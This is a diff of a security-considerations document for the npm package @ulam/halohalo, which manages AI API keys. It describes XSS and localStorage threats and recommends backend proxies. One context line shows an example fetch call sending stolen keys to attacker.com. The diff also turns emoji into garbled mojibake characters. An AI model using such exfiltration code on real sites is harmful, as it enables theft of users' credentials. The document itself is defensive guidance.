@@ -1,10 +1,10 @@
-# Security Considerations for @ulam/halohalo
+﻿# Security Considerations for @ulam/halohalo
 
 This document outlines security best practices when using halohalo to store and manage API keys.
 
 ---
 
-## ⚠️ API Key Storage
+## âš ï¸ API Key Storage
 
 ### Default Behavior (Development Only)
 
@@ -23,7 +23,7 @@ Browser JavaScript has no access to secure storage mechanisms (secure enclave, T
 
 ---
 
-## ⚠️ Threats & Mitigations
+## âš ï¸ Threats & Mitigations
 
 ### Threat 1: XSS Attack Exposes All Keys
 
@@ -52,7 +52,7 @@ fetch('https://attacker.com/steal', {
 
 ```javascript
 // User A logs out
-// User B opens browser DevTools → Application → Local Storage
+// User B opens browser DevTools â†’ Application â†’ Local Storage
 // Sees all of User A's API keys
 ```
 
@@ -80,7 +80,7 @@ https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5:generateConte
 
 ---
 
-## ✅ Safe Usage Patterns
+## âœ… Safe Usage Patterns
 
 ### Pattern 1: Backend API Proxy (Recommended for Web Apps)
 
@@ -108,13 +108,13 @@ const response = await fetch('/api/ai/complete', {
 app.post('/api/ai/complete', async (req, res) => {
   const { prompt } = req.body
   const apiKey = process.env.ANTHROPIC_API_KEY // From env, never in code
-  
+
   const completion = await createCompletion(prompt, {
     provider: 'anthropic',
     apiKey,
     model: 'claude-sonnet-4-6'
   })
-  
+
   res.json({ completion })
 })
 ```
@@ -221,26 +221,26 @@ const response = await createCompletion('Hello', config)
 
 ---
 
-## ❌ Do NOT
+## âŒ Do NOT
 
-- ❌ **Store real API keys in localStorage** in production web apps
-- ❌ **Commit API keys to git** (ever, even in example code)
-- ❌ **Log API keys** in console or to third-party services
-- ❌ **Embed keys in client-side config files** (.env.local, config.js, etc.)
-- ❌ **Use environment variables set at build time** for browser apps
-- ❌ **Embed Google/OpenAI keys in URLs** (they appear in logs)
+- âŒ **Store real API keys in localStorage** in production web apps
+- âŒ **Commit API keys to git** (ever, even in example code)
+- âŒ **Log API keys** in console or to third-party services
+- âŒ **Embed keys in client-side config files** (.env.local, config.js, etc.)
+- âŒ **Use environment variables set at build time** for browser apps
+- âŒ **Embed Google/OpenAI keys in URLs** (they appear in logs)
 
 ---
 
-## ✅ Do
+## âœ… Do
 
-- ✅ **Use environment variables in backend** (`process.env.API_KEY` in Node.js)
-- ✅ **Proxy all API calls through your backend** for web applications
-- ✅ **Use platform-specific secure storage** (Electron, Extension, Native app)
-- ✅ **Rotate keys regularly** and monitor for leaks
-- ✅ **Set rate limits and budgets** on all API keys
-- ✅ **Use separate keys for development/staging/production**
-- ✅ **Document your architecture** so team members follow secure patterns
+- âœ… **Use environment variables in backend** (`process.env.API_KEY` in Node.js)
+- âœ… **Proxy all API calls through your backend** for web applications
+- âœ… **Use platform-specific secure storage** (Electron, Extension, Native app)
+- âœ… **Rotate keys regularly** and monitor for leaks
+- âœ… **Set rate limits and budgets** on all API keys
+- âœ… **Use separate keys for development/staging/production**
+- âœ… **Document your architecture** so team members follow secure patterns
 
 ---
 
